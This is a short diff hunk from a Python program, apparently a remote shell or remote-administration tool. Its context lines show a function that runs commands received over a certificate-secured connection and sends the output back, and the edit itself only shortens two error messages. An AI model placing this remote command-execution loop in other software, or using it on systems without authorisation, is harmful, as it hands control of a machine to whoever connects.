@@ -48,9 +48,9 @@ def interact(cert ,key ,host ,port, data="0"):
                     	command = run(command_split, capture_output=True).stdout              #runs the recieved command and sends the result of the command back
                     	conn.send(command)                                                    
                     except:
-                        error=("error  with the command "+str(command_split))                 #returns and error if command failed
+                        error=("error with the command")                 #returns and error if command failed
                         conn.send(error.encode())
-                        print("error with the command "+str(command_split))
+                        print("error with the command")
 def get_host_info():
     """
         Description:
